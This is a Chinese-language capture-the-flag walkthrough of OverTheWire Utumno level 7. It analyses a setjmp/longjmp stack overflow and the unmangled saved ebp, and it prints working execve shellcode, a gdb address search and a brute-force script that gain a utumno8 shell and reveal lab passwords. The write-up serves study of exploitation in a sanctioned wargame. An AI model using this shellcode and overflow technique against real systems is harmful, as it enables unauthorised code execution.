**Pass :** totiquegae


依旧选择dump到本地分析。

```bash
$ ./crawl.sh 7 totiquegae
sshpass -p totiquegae scp -P 2227 utumno7@utumno.labs.overthewire.org:/utumno/utumno7  .
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

[*] '/home/z1933/workplace/vbshare/ctf/utumno7'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

```

好吧,程序逻辑越来越复杂了。

用c还原了一下程序逻辑：

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <setjmp.h>
#include<string.h>
jmp_buf* jbp;
void jmp(int i){
    longjmp(*jbp,i);
}
int vuln (char* arg){
    char buf[128]; 
    jmp_buf foo;
    int i=0;
    jbp=&foo;

    i=setjmp(foo);
    /* If the result is not 0 then we have returned from a call to longjmp */
    if(!i){
        strcpy(buf,arg); 
        /* can be anything except 0 */
        jmp(23);
    }
    return 0; 
}
int main(int argc, char *argv[]){
    if(argc<=1){
        puts("lol ulrich && fuck hector");
        exit(1);
    }
    vuln((char*)argv[1]);
}
```


**两个jmp函数功能TL;DR**

setjmp功能就是调用时会保存调用setjmp前程序执行的上下文(比如eip,esp等寄存器)到一个结构体里面。调用longjmp的时,longjmp根据之前的setjmp保存的结构体还原程序的上下文。通俗的说，setjmp就是打快照，longjmp就是还原快照，快照的还原点是调用setjmp的后一条语句。


setjmp,longjmp 函数具体可以参考:[C Language: longjmp function](https://www.techonthenet.com/c_language/standard_library_functions/setjmp_h/longjmp.php)。

**两个函数的实现原理&此题解法:**

jmp_buf差不多具有以下结构：

```cpp
/* Calling environment, plus possibly a saved signal mask.  */
struct __jmp_buf_tag
  {
    /* NOTE: The machine-dependent definitions of `__sigsetjmp'
       assume that a `jmp_buf' begins with a `__jmp_buf' and that
       `__mask_was_saved' follows it.  Do not move these members
       or add others before it.  */
    int __jmp_buf[6] ;		/* Calling environment.  */
    int __mask_was_saved;	/* Saved the signal mask?  */
    __sigset_t __saved_mask;	/* Saved signal mask.  */
  };

```

可以猜到此结构会存储6个寄存器的值。

从IDA的反汇编可以看出,strcpy函数复制时`buf[120]`的偏移是ebp+288。`struct foo`的偏移是ebp+160。

本来我想找一下setjmp的源码分析一下执行逻辑，但根据[Where is glibc's code for setjmp?](https://stackoverflow.com/questions/31784802/where-is-glibcs-code-for-setjmp)表示其是用汇编语言实现的,于是就硬刚汇编语言分析了。

**TL;DR**: 直接看汇编注释中`===>>>!!!`加精部分。

setjmp函数的反汇编： 

```
libc_2.33.so:F7DF0530 _setjmp:
libc_2.33.so:F7DF0530 xor     eax, eax      
libc_2.33.so:F7DF0532 mov     edx, [esp+4]      ; 得到 jmp_buf的地址
libc_2.33.so:F7DF0536 mov     [edx], ebx        ; jmp_buf.__jmp_buf[0]=ebx
libc_2.33.so:F7DF0538 mov     [edx+4], esi      ; jmp_buf.__jmp_buf[1]=esi
libc_2.33.so:F7DF053B mov     [edx+8], edi      ; jmp_buf.__jmp_buf[2]=edi ,依次保存寄存器
libc_2.33.so:F7DF053E lea     ecx, [esp+4]      ; ecx=esp+4 (运行时观察栈会发现是在esp+4是setjmp调用之前的栈指针位置)
libc_2.33.so:F7DF0542 xor     ecx, large gs:18h ; ecx^=gs:18h 
libc_2.33.so:F7DF0549 rol     ecx, 9            ; ecx rol=9
libc_2.33.so:F7DF054C mov     [edx+10h], ecx    ; jmp_buf.__jmp_buf[4]=ecx ,>>>===!!! 保存编码后setjmp函数调用之前的栈指针
libc_2.33.so:F7DF054F mov     ecx, [esp]        ; ecx=*esp ，运行是发现栈顶保存返回地址,也就是ecx为setjmp函数的返回地址。
libc_2.33.so:F7DF0552 xor     ecx, large gs:18h ; ecx^=gs:18h
libc_2.33.so:F7DF0559 rol     ecx, 9            ; ecx rol=9,rol表示循环左移
libc_2.33.so:F7DF055C mov     [edx+14h], ecx    ; jmp_buf.__jmp_buf[5]=ecx ,===>>>!!! 经过一些编码的eip保存。
libc_2.33.so:F7DF055F mov     [edx+0Ch], ebp    ; jmp_buf.__jmp_buf[3]=ebp,ebp指向setjmp调用之前的栈帧。保存
libc_2.33.so:F7DF0562 mov     [edx+18h], eax    ; jmp_buf.__mask_was_saved=eax=0
libc_2.33.so:F7DF0565 retn
```

longjmp函数还原eip部分(因为我们只对这部分感兴趣)的反汇编：

```
libc_2.33.so:F7DF0630 mov     eax, [esp+4]      ; eax=&jmp_buf  得到之前保存的jmp_buf的地址。
libc_2.33.so:F7DF0634 mov     edx, [eax+14h]    ; edx=jmp_buf.__jmp_buf[5], ===>>>!!! 取edx也就是编码后的setjmp返回地址（即之前存的eip）。
libc_2.33.so:F7DF0637 mov     ecx, [eax+10h]    ; ecx=jmp_buf.__jmp_buf[4], 得到编码后setjmp函数调用之前的栈指针
libc_2.33.so:F7DF063A ror     edx, 9            ; edx循环右移9位
libc_2.33.so:F7DF063D xor     edx, large gs:18h ; edx与gs:18h ===>>>!!! 解码还原eip也就是setjmp的返回地址。
libc_2.33.so:F7DF0644 ror     ecx, 9            
libc_2.33.so:F7DF0647 xor     ecx, large gs:18h ; 解码栈指针
libc_2.33.so:F7DF064E mov     ebx, [eax]
libc_2.33.so:F7DF0650 mov     esi, [eax+4]
libc_2.33.so:F7DF0653 mov     edi, [eax+8]
libc_2.33.so:F7DF0656 mov     ebp, [eax+0Ch]
libc_2.33.so:F7DF0659 mov     eax, [esp+8]      ; 以此根据buf还原寄存器。
libc_2.33.so:F7DF065D mov     esp, ecx          ; 还原栈指针
libc_2.33.so:F7DF065F jmp     edx               ; edx为解码后的setjmp函数返回地址,跳转回去。

```

esp，和eip在jmp_buf中的保存的时候编码了，只要一改动eip(`xor  edx, large gs:18h`类似于金丝雀)解码就不对，程序直接崩。就不能覆盖所保存的eip了。

继续观察longjmp返回后的反汇编,也就是到setjmp后的语句,因为此时`if(!i)`判断为假了,程序直接返回，让我们来看看此后的指令执行：

```
.text:080484FA                 mov     eax, 0
.text:080484FF                 leave
.text:08048500                 retn
```

我们知道 leave 指令等价于:`mov esp,ebp + pop ebp`组合指令，retn 指令会先`pop eip`。虽然esp，eip编码了，但是ebp没有编码！！(ebp在jmp_buf+12的位置)。


于是我们就可以在strcpy时把结构题所保存的ebp覆盖为某个地址，此地址+4指向的地址指向环境变量shllcode的地址。这样返回的时候eip直接指向我们的shellcode。


差不多构造成下面这样,假设ebp需要为`CCCC`:

```bash
./utumno7 $(python -c "print 'A'*128+'BBBB'*3+'CCCC'")

```

我直接上号。

```bash
utumno7@utumno:/tmp/jkfl$ export SHELLCODE=$(python -c 'print 200 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0f\x2c\x04\xcd\x80"')

```

写一个程序看一下shellcode的序号.

```cpp
#include <stdio.h>

int main(int argc, char *argv[], char **envp){
    int i=0;    
    while(*envp){
        printf("add[%d]: %s\n",i,*envp);
        i++; 
        envp++;
    }
}
```

```bash
utumno7@utumno:/tmp/jkfl$ gcc -m32 number.c -o number
utumno7@utumno:/tmp/jkfl$ ./number

...

add[8]: LC_NAME=en_US.UTF-8
add[9]: SHELLCODE=��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin��1�1Ұ,̀
add[10]: USER=utumno7
add[11]: PWD=/tmp/jkfl
add[12]: HOME=/home/utumno7
add[13]: SSH_CLIENT=183.227.200.198 10908 22
add[14]: LC_ADDRESS=en_US.UTF-8
add[15]: LC_NUMERIC=en_US.UTF-8
add[16]: SSH_TTY=/dev/pts/0
add[17]: MAIL=/var/mail/utumno7
add[18]: TERM=xterm-256color
add[19]: SHELL=/bin/bash
add[20]: TMOUT=1800
add[21]: SHLVL=1
add[22]: LC_TELEPHONE=en_US.UTF-8
add[23]: LOGNAME=utumno7
add[24]: PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
add[25]: LC_IDENTIFICATION=en_US.UTF-8
add[26]: LC_TIME=en_US.UTF-8
add[27]: _=./number
...

序号是第9个的样子,用gdb看一下地址shellcode指针地。

```bash
utumno7@utumno:/tmp/jkfl$ gdb -q  /utumno/utumno7
Reading symbols from /utumno/utumno7...done.
(gdb) break *main
Breakpoint 1 at 0x8048501: file utumno7.c, line 32.
(gdb) r abcd
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /utumno/utumno7 abcd

Breakpoint 1, main (argc=2, argv=0xffffd574) at utumno7.c:32
32	in utumno7.c
(gdb) x/wx (char **)environ+9
0xffffd5a4:	0xffffdd5a
(gdb) x/s 0xffffdd5a
0xffffdd5a:	"LC_NAME=en_US.UTF-8"
(gdb) x/wx (char **)environ+10
0xffffd5a8:	0xffffdd6e
(gdb) x/s 0xffffdd6e
0xffffdd6e:	"SHELLCODE=", '\220' <repeats 190 times>...

```

最开始发现9不是，再往后找一个,可能gdb启动的时候里面加了一个环境变量。所以我们需要的地址在`0xffffd5a8`附近,退出gdb,写个脚本暴力枚举后面两位。


```bash
#!/usr/bin/env bash

while [[ $i  -lt  255 ]];
do
    x=`printf "%02X\n"  $i`
    echo $x
#    echo "$(python -c "print 'A'*128+'BBBB'*3+'\x${x}\xd1\xff\xff'")"
    /utumno/utumno7  $(python -c "print 'A'*128+'BBBB'*3+'\x${x}\xd5\xff\xff'")
    
    i=`expr $i + 1` 
done

```


```bash
utumno7@utumno:/tmp/jkfl$ chmod +x force.sh 
utumno7@utumno:/tmp/jkfl$ ./force.sh 

...

lol ulrich && fuck hector
./force.sh: line 11: 23038 Segmentation fault      /utumno/utumno7 $(python -c "print 'A'*128+'BBBB'*3+'\x${x}\xd5\xff\xff'")
15
lol ulrich && fuck hector
./force.sh: line 11: 23042 Segmentation fault      /utumno/utumno7 $(python -c "print 'A'*128+'BBBB'*3+'\x${x}\xd5\xff\xff'")
16
lol ulrich && fuck hector
./force.sh: line 11: 23046 Segmentation fault      /utumno/utumno7 $(python -c "print 'A'*128+'BBBB'*3+'\x${x}\xd5\xff\xff'")
17
lol ulrich && fuck hector
./force.sh: line 11: 23050 Segmentation fault      /utumno/utumno7 $(python -c "print 'A'*128+'BBBB'*3+'\x${x}\xd5\xff\xff'")
18
lol ulrich && fuck hector
./force.sh: line 11: 23054 Segmentation fault      /utumno/utumno7 $(python -c "print 'A'*128+'BBBB'*3+'\x${x}\xd5\xff\xff'")
19
lol ulrich && fuck hector
./force.sh: line 11: 23058 Segmentation fault      /utumno/utumno7 $(python -c "print 'A'*128+'BBBB'*3+'\x${x}\xd5\xff\xff'")
1A
lol ulrich && fuck hector
./force.sh: line 11: 23062 Segmentation fault      /utumno/utumno7 $(python -c "print 'A'*128+'BBBB'*3+'\x${x}\xd5\xff\xff'")
1B
lol ulrich && fuck hector
./force.sh: line 11: 23066 Segmentation fault      /utumno/utumno7 $(python -c "print 'A'*128+'BBBB'*3+'\x${x}\xd5\xff\xff'")
1C
lol ulrich && fuck hector
$ whoami 
utumno8
$ cat /etc/utumno_pass/utumno8
jaeyeetiav
$ 

```
一切皆在我们的计算之中。理论上能行，实际上也能行。挺好的一道题,虽然想了许久。

## Utumno 08

**SSH :** ssh utumno8@utumno.labs.overthewire.org -p 2227

**Pass :** jaeyeetiav

完结撒花。
